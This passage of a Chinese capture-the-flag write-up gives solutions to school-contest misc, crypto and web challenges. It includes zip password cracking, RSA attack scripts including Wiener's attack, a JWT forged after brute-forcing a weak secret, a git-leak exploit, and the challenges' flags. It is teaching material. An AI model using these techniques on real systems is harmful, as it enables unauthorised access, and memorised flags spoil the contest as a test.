&quot;__main__&quot;:</span><br><span class="line">    folder_path = r&quot;D:\第二次校赛\attachment_QR&quot;  # 你的二维码图片文件夹路径</span><br><span class="line">    if not os.path.exists(folder_path):</span><br><span class="line">        print(&quot;文件夹不存在，请检查路径是否正确！&quot;)</span><br><span class="line">    else:</span><br><span class="line">        extract_flag_from_folder(folder_path)</span><br></pre></td></tr></table></figure><p>他的输出结果就是下面这样</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/EfgGb2xB4oSEydx7L0Ucsx6EnZg.png"></p><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>利用网站批量扫描<br><a href="https://cli.im/deqr/other">https://cli.im/deqr/other</a></p><h2 id="你是-mvp-还是躺赢狗？"><a href="#你是-mvp-还是躺赢狗？" class="headerlink" title="你是 mvp 还是躺赢狗？"></a>你是 mvp 还是躺赢狗？</h2><p>打开附件后是下面的这样的一张图</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/NbXHbJOYYoZEpux2vNrcHKLTnTc.png"></p><p>将其拖进 010，看看有没有隐藏的东西</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Wmt0b4tiBoTPvHxSXbkcmABMnyh.png"></p><p>在 010 中可以看出有另外一个压缩包，复制后在 010 中新建一个文件，并保存</p><p>打开后 ，是这样的一幅图</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/JsAXbXW4CoC1ddxZAE9cqSBKndg.png"></p><p>很显然，图片的高度被切割了</p><p>可以在 010 中修改图片的高度，像下面橘色区域的位置，我这是已经修改好的</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Pe9wbvMzBoTjZHx0FsVc52GRnpd.png"></p><p>保存后，重新打开这张图片就能看到被隐藏的 flag</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/F9NybhlLRoOfB8xIPZOcVTlpnvb.png"></p><p><code>QLNU&#123;l00k_1n_My_3ye5_!&#125;</code></p><h2 id="奇怪的动图"><a href="#奇怪的动图" class="headerlink" title="奇怪的动图"></a>奇怪的动图</h2><p>根据提示，这道题目利用明文攻击</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/LK39bJUm5ogxt5xjLgucd5kZnaf.png"></p><p>压缩 orgin.gif 成 zip 文件</p><p>利用 ARCHPR 工具进行明文攻击</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/SVIRb6RkloE7hhxVfoucurK7nvc.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/ADX6bwICGoKSKOxKLOVc8U6mnvd.png"></p><p>我们根据 wp 中已知：flag 的二进制数列转换成不同大小的帧间隔（因为 gif 非常的卡）</p><p>利用 puzzlesolve 提取帧间隔</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Y7Y4bHZLAopY1hxQfstcjeyJnob.png"></p><p>利用赛博厨子</p><p>将 30 改 0，130 改 1，如下：</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Nvw9b41sfofmMQxbmtNc6VCUnAb.png"></p><p><code>0100000000110001010001100101111101101001001101010101111101100001011011010100000001111010001100010110111000111001</code></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/JqPbbEmwvoyOEyx64z9ckbgIn8O.png"></p><p>得到 flag：<code>QLNU&#123;@1F_i5_am@z1n9&#125;</code></p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>打开后说 flag 为 UUxOVXtxMW51X3l5ZDUhfQ&#x3D;&#x3D;</p><p>利用赛博厨子进行转换，最终得到</p><p><code>QLNU&#123;q1nu_yyd5!&#125;</code></p><h2 id="生日的祝福"><a href="#生日的祝福" class="headerlink" title="生日的祝福"></a>生日的祝福</h2><p>从祝福信中</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/J8OUbvK6PoAR8CxUUttcJFFnnYe.png"></p><p>得到密码的形式，及使用 binwalk 工具</p><p>另外我们还有一个不知格式的生日礼物</p><p>我们看看它的十六进制，看看有什么隐藏的线索</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/L3OZbHtaQo3hBmxwPLUcMZGanCa.png"></p><p>新建一个文件，将下面的十六进制文本复制，如下：</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Olh1bQfRboVIbnxxhEtcdudgnMe.png"></p><p>保存成 zip 文件</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/P0OibrPOIo8c7FxI2JQcA4NFnJt.png"></p><p>这个时候要找到压缩文件的密钥，也就是从生日祝福中得到的线索</p><p>这个时候利用我们已知的信息进行掩码攻击</p><p>格式：<code>??-18??-??-14</code></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/IMO4b4HCUoA7QxxLkMlcxCxxnPf.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/JIVHbHwCYonUYcx4WRIcc7Srn4e.png"></p><p>得到密码为 <code>xy-1845-11-14</code></p><p>放进赛博厨子，进行了 16 次不换表 base64 解密，即偏移量为 16</p><p>打开后看到</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Tf2CbOZjKoI9pTxJWKAc5olMnLh.png"></p><p>我们在另外一个文件中看到</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/NNmBb6lEuoRS3MxL4bwc0p9vnyb.png"></p><p>给他进行凯撒解码，得到</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/TAyVbVdUMoyDx6xixRfceGqNnuc.png"></p><p>这样就得到新表为：<code>ABCDEFGabcdefghijklmnopqrstuvwxyzHIJKLMNOPQRST0123456789+/UVWXYZ</code></p><p>再进行 base64 解码，4 次，得到 flag</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/EwD3bR3DCo7cUCxZWgRcKdDtnLe.png"></p><p><code>QLNU&#123;Y0u_@r4_gO0d_Ctfer!&#125;</code></p><h2 id="NetTraffic"><a href="#NetTraffic" class="headerlink" title="NetTraffic"></a>NetTraffic</h2><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/G2kPbHj2LoV0yxxDKXncC9KVnPd.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/GU0BbnsdTo0CL3xkqHfcb2vKnBc.png"></p><p><code>e45e329feb5d925b</code></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/DnHIbwwy3osWmpxKIIacF1bWnwf.png"></p><p><code>mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j7iPM15/igg+WdSX6rY+JBrmtNQgtQXXmACCBBgYmo3UC3C0ttYlk6fo7cEZ4KL2ywLgZlrAte/3VIAP80dXyUz/tEWGpwURP8oXl3z7kUkzk1oWz3A7q76gXiDzi0WuWNBNNOd/IKpT3XrRVblJ3yMo0N8Frw9kmCkJpK8gnIKag==</code></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/ACf5bfz2JoDxmOxThubcHYAUn6b.png"></p><p>继续往下找</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/BxpdbKOsPoXDXgxiteLcpgYWn3g.png"></p><p><code>mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j6FRdeJTeKrveUGDa4E0d7ntz2dsvDXhVWBK0RRSwrdm5Puy5yjoJ/kEwBRPs7RVZed8+l7HBOmx/mDvLCbKp8V</code></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/IcOWbgr28oBS3axCwvRcZjpPnIf.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/TzD1blQtsoeZ73xzVwHcLEQjnHd.png"></p><p>获得 flag：<code>QLNU&#123;b3h1NdEr_WebShEll_A_L1ttle_hArd&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p= <span class="number">90387314829577654422580031074599849052489238017386590909427609518517830566632094153174983956061626373542148240632197282485834233498500360232839084537084441830816514377758069170092001168381491479309335271918675512196998198539464292877701133358699988066055212018603381917137199082127062670061784408062745010247</span></span><br><span class="line"></span><br><span class="line">q= <span class="number">131956964140437962238499019120856300797119073778027003002410884250396411838742340328080251408907361408806296819791922928892510090479973276769850659868697243411701946298190698869130430898400373194761890908225250866477990376871572627474128475108692336502916114993456438619932236295206409818033775388146000072237</span></span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">10410921907308276410589892193503777002613206525409600556582550130141239927384225094961244567250536114378262855720197279202379339896438970790676722385500897567129069224577416685817545829358494364962182199000462733858163411476930100883908770692701838181723658773973906387237278170734899690708594256204971349985771317564511229193597685929139414357691595246148020635838183673924739613551091535814336813669476452556824499750065035663728996877554070485866597029563465929590470889674480345186537435258607153437323899798451617074637518593529083308029187565110013064533249964278447406229869537622883525179107457102587647233026</span></span><br><span class="line"></span><br><span class="line">求明文m</span><br></pre></td></tr></table></figure><p>利用脚本来解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import inverse</span><br><span class="line"></span><br><span class="line"># 给定的参数</span><br><span class="line">p = 90387314829577654422580031074599849052489238017386590909427609518517830566632094153174983956061626373542148240632197282485834233498500360232839084537084441830816514377758069170092001168381491479309335271918675512196998198539464292877701133358699988066055212018603381917137199082127062670061784408062745010247</span><br><span class="line">q = 131956964140437962238499019120856300797119073778027003002410884250396411838742340328080251408907361408806296819791922928892510090479973276769850659868697243411701946298190698869130430898400373194761890908225250866477990376871572627474128475108692336502916114993456438619932236295206409818033775388146000072237</span><br><span class="line">e = 65537</span><br><span class="line">c = 10410921907308276410589892193503777002613206525409600556582550130141239927384225094961244567250536114378262855720197279202379339896438970790676722385500897567129069224577416685817545829358494364962182199000462733858163411476930100883908770692701838181723658773973906387237278170734899690708594256204971349985771317564511229193597685929139414357691595246148020635838183673924739613551091535814336813669476452556824499750065035663728996877554070485866597029563465929590470889674480345186537435258607153437323899798451617074637518593529083308029187565110013064533249964278447406229869537622883525179107457102587647233026</span><br><span class="line"></span><br><span class="line"># 计算 n 和 φ(n)</span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line"># 计算 d = e^(-1) mod φ(n)</span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"># 解密过程：m = c^d mod n</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line"># 将明文从数字转换为字符串（假设明文是ASCII编码）</span><br><span class="line">m_hex = hex(m)[2:]  # 将明文转换为十六进制字符串</span><br><span class="line">m_bytes = bytes.fromhex(m_hex)  # 将十六进制字符串转换为字节</span><br><span class="line">m_text = m_bytes.decode(&#x27;utf-8&#x27;)  # 将字节解码为字符串</span><br><span class="line"></span><br><span class="line">print(&quot;明文 m:&quot;, m_text)</span><br></pre></td></tr></table></figure><p>得到 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;9f873f1c0315202caf47572a0bc24715&#125;</span><br></pre></td></tr></table></figure><h2 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h2><p>先看提示：e 很大</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import hashlib</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">d = getPrime(256)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = gmpy2.invert(d, (p**2 - 1) * (q**2 - 1))</span><br><span class="line">flag = &quot;QLNU&#123;&quot; + hashlib.md5(str(p + q).encode()).hexdigest() + &quot;&#125;&quot;</span><br><span class="line">p_q=p*q</span><br><span class="line">print(&quot;e=\n&quot;,e)</span><br><span class="line">print(&quot;p_q=&quot;,p_q)</span><br><span class="line"></span><br><span class="line">#e= 11881209201971769960545703420363113088458113193917302081488139824023488466450534979302732775384261289951663819889383871283393435874567676058308730840994269996270426872346181095147425555870816458739259424057593858926773175930567718921307007595412152051860198768425341047243910648792204871486820556061229776758481253766707460244191508467315608593552402934008546939260075670480877521747770290966713971305116824304584455834311003344575523703742396038296944940442595094190044721224502492997055499840877943626918705332507414838517447739584296497147630049609284613069010147083669015648970926768008012325363050285133655831209</span><br><span class="line">#p_q= 130506917901757833500880656818230820111814896821558809911665070609238340634103350641776200339447972610494005145107335910027066209703279478749621714942522771203012251624129809835281668541767719703766910930322436841293254585077622914048546318552348193600182349920340961207838400472237841419251522129796103603763</span><br></pre></td></tr></table></figure><p>找脚本来解决这个问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def continuedFra(x, y):</span><br><span class="line">    &quot;&quot;&quot;计算连分数</span><br><span class="line">    :param x: 分子</span><br><span class="line">    :param y: 分母</span><br><span class="line">    :return: 连分数列表</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    cf = []</span><br><span class="line">    while y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    return cf</span><br><span class="line">def gradualFra(cf):</span><br><span class="line">    &quot;&quot;&quot;计算传入列表最后的渐进分数</span><br><span class="line">    :param cf: 连分数列表</span><br><span class="line">    :return: 该列表最后的渐近分数</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    numerator = 0</span><br><span class="line">    denominator = 1</span><br><span class="line">    for x in cf[::-1]:</span><br><span class="line">        # 这里的渐进分数分子分母要分开</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    return numerator, denominator</span><br><span class="line">def solve_pq(a, b, c):</span><br><span class="line">    &quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span><br><span class="line">    :param a:x^2的系数</span><br><span class="line">    :param b:x的系数</span><br><span class="line">    :param c:pq</span><br><span class="line">    :return:p，q</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    par = gmpy2.isqrt(b * b - 4 * a * c)</span><br><span class="line">    return (-b + par) // (2 * a), (-b - par) // (2 * a)</span><br><span class="line">def getGradualFra(cf):</span><br><span class="line">    &quot;&quot;&quot;计算列表所有的渐近分数</span><br><span class="line">    :param cf: 连分数列表</span><br><span class="line">    :return: 该列表所有的渐近分数</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    gf = []</span><br><span class="line">    for i in range(1, len(cf) + 1):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    return gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wienerAttack(e, n):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param e:</span><br><span class="line">    :param n:</span><br><span class="line">    :return: 私钥d</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    for d, k in gf:</span><br><span class="line">        if k == 0: continue</span><br><span class="line">        if (e * d - 1) % k != 0:</span><br><span class="line">            continue</span><br><span class="line">        phi = (e * d - 1) // k</span><br><span class="line">        p, q = solve_pq(1, n - phi + 1, n)</span><br><span class="line">        if p * q == n:</span><br><span class="line">            return d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=11881209201971769960545703420363113088458113193917302081488139824023488466450534979302732775384261289951663819889383871283393435874567676058308730840994269996270426872346181095147425555870816458739259424057593858926773175930567718921307007595412152051860198768425341047243910648792204871486820556061229776758481253766707460244191508467315608593552402934008546939260075670480877521747770290966713971305116824304584455834311003344575523703742396038296944940442595094190044721224502492997055499840877943626918705332507414838517447739584296497147630049609284613069010147083669015648970926768008012325363050285133655831209</span><br><span class="line">n=130506917901757833500880656818230820111814896821558809911665070609238340634103350641776200339447972610494005145107335910027066209703279478749621714942522771203012251624129809835281668541767719703766910930322436841293254585077622914048546318552348193600182349920340961207838400472237841419251522129796103603763</span><br><span class="line">d=wienerAttack(e, n**2)</span><br><span class="line">k = e * d - 1</span><br><span class="line"></span><br><span class="line">r = k</span><br><span class="line">t = 0</span><br><span class="line">while True:</span><br><span class="line">    r = r // 2</span><br><span class="line">    t += 1</span><br><span class="line">    if r % 2 == 1:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">success = False</span><br><span class="line"></span><br><span class="line">for i in range(1, 101):</span><br><span class="line">    g = random.randint(0, n)</span><br><span class="line">    y = pow(g, r, n)</span><br><span class="line">    if y == 1 or y == n - 1:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">    for j in range(1, t):</span><br><span class="line">        x = pow(y, 2, n)</span><br><span class="line">        if x == 1:</span><br><span class="line">            success = True</span><br><span class="line">            break</span><br><span class="line">        elif x == n - 1:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            y = x</span><br><span class="line"></span><br><span class="line">    if success:</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">if success:</span><br><span class="line">    p = libnum.gcd(y - 1, n)</span><br><span class="line">    q = n // p</span><br><span class="line">    print(&#x27;P: &#x27; + &#x27;%s&#x27; % p)</span><br><span class="line">    print(&#x27;Q: &#x27; + &#x27;%s&#x27; % q)</span><br><span class="line">    hash_result = hashlib.md5(str(p + q).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    print(b&#x27;QLNU&#123;&#x27; + hash_result.encode() + b&#x27;&#125;&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;Cannot compute P and Q&#x27;)</span><br></pre></td></tr></table></figure><p><code>QLNU&#123;88a27758257b7c87174b6ea972a1b854&#125;</code></p><h2 id="not-prime"><a href="#not-prime" class="headerlink" title="not_prime"></a>not_prime</h2><p>根据提示，e 和 phi 不互素</p><p>原题脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">m=bytes_to_long(b&#x27;xxxxxx&#x27;)</span><br><span class="line">p=getPrime(1024)</span><br><span class="line">q=getPrime(1024)</span><br><span class="line">e= 485</span><br><span class="line">n=p*q</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line">print(&quot;p=&quot;,p)</span><br><span class="line">print(&quot;q=&quot;,q)</span><br><span class="line">print(&quot;c=&quot;,c)</span><br><span class="line"></span><br><span class="line">#p= 90001590571628449882768356132693793320380710587438751445227717046797643492854890272077076028501400801674037970146456442693356333145725683391580452197350307034664396425412189131031945585055386833984609074633912616551061262531556612042816706715156941338165698736593509428548029187638818394121469201965625147221</span><br><span class="line">#q= 105269145185972005922101600001495560536711004054072625220240025622162044045232737266024106976484532324266604741308149241323569573803457119996593779129028876049944017213001133943043835369146690600654256999505984093654055465044150981679096848362996982680425629145233824412870249754368525048882875131030178432721</span><br><span class="line">#c= 4011466196771057453748051548070252889305829159014486083134296940977745797784900339093445458817425649129360677656834717166461191857503662276260763813274523589374268178658075412219913461626103952622745086746603503909555807801624176466958878038820537440624646031996479670501067595211298340535838371124894533011681024206320817178328457414141064757221298996098449657759602092816345597925775497162488952621217176091286174386154264803599820578496373057033647920530416431159596919698553375884228694958053211497272788860741443420407312773534728288229296432297638584262400238090812394095583427915756299194616536991896049110187</span><br></pre></td></tr></table></figure><p>利用脚本解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">p= 90001590571628449882768356132693793320380710587438751445227717046797643492854890272077076028501400801674037970146456442693356333145725683391580452197350307034664396425412189131031945585055386833984609074633912616551061262531556612042816706715156941338165698736593509428548029187638818394121469201965625147221</span><br><span class="line">q= 105269145185972005922101600001495560536711004054072625220240025622162044045232737266024106976484532324266604741308149241323569573803457119996593779129028876049944017213001133943043835369146690600654256999505984093654055465044150981679096848362996982680425629145233824412870249754368525048882875131030178432721</span><br><span class="line">e= 485</span><br><span class="line">c= 4011466196771057453748051548070252889305829159014486083134296940977745797784900339093445458817425649129360677656834717166461191857503662276260763813274523589374268178658075412219913461626103952622745086746603503909555807801624176466958878038820537440624646031996479670501067595211298340535838371124894533011681024206320817178328457414141064757221298996098449657759602092816345597925775497162488952621217176091286174386154264803599820578496373057033647920530416431159596919698553375884228694958053211497272788860741443420407312773534728288229296432297638584262400238090812394095583427915756299194616536991896049110187</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 当e约去公约数后与phi互素</span><br><span class="line">def decrypt(p, q, e, c):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - 1) * (q - 1)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    m = pow(c, d, n)</span><br><span class="line">    print(m)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    print(msg)</span><br><span class="line">    if msg[1]:</span><br><span class="line">        (print(long_to_bytes(msg[0])))</span><br><span class="line"></span><br><span class="line">decrypt(p, q, e, c)</span><br></pre></td></tr></table></figure><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/HFW2bmTmHo8PXaxCtymcbJDznzb.png"></p><p><code>QLNU&#123;1f4154c0-9d88-4882-b41f-75ce14664c91&#125;</code></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Myjwt"><a href="#Myjwt" class="headerlink" title="Myjwt"></a>Myjwt</h2><p>看提示</p><p>jwt 是个啥</p><p>弱密钥</p><p>题目名字 myjwt 也是一个工具</p><p>这里使用 <a href="https://jwt.io/">https://jwt.io/</a></p><p>利用 myjwt 工具，获得密码</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/A6SvboDrooGIVMxzEIicMfqon1g.png"></p><p>使用 myjwt 得到新的 jwt，利用字典暴破得到密码为 12345678</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/A6yEbreyYovhTLxoDJacn9MenEc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJleHAiOjE3NDI3MzA0MTF9.D6_ADIpgPto9XWtPKPqN17CX3x1NZ3_1VoEIDhmsbXY</span><br></pre></td></tr></table></figure><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/IJ1dbzfmboy1zYx4z9qcEEeAnbc.png"></p><p>将 guest 改为 admin</p><p>密码为 12345678</p><p>得到新的 jwt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3NDI3MzA0MTF9.TNnlCu96PT8VmwGmzhmvcEiGDODVX7g_mu8B824rEKE</span><br></pre></td></tr></table></figure><p>再使用 insomnia</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/QHChbYXUvoT7OExvm2Gc97Mun2d.png"></p><p><code>flag&#123;8146d9bd-18d1-4512-bb44-c1a2dcf7d2f2&#125;</code></p><h2 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h2><p>根据已知条件，题目网址为 <a href="https://balabala.sky233.top/">https://balabala.sky233.top/</a></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/TfDebMD9lojT0cxHPhacsAaQnhf.png"></p><p>输入 <a href="https://balabala.sky233.top/robots.txt">https://balabala.sky233.top/robots.txt</a></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/FCR1bLcp1o3mmexmC82c8XyVnUg.png"></p><p>可以知道这道题目为 git 泄露<br>我是从虚拟机中解决的这道题</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/QGIUbKJpMo9ro1x8ATgc1wpYngX.jpg"></p><p>得到 flag</p><p><code>QLNU&#123;S1mpl3_g1t_AnD_sWp&#125;</code></p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>先看一下源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 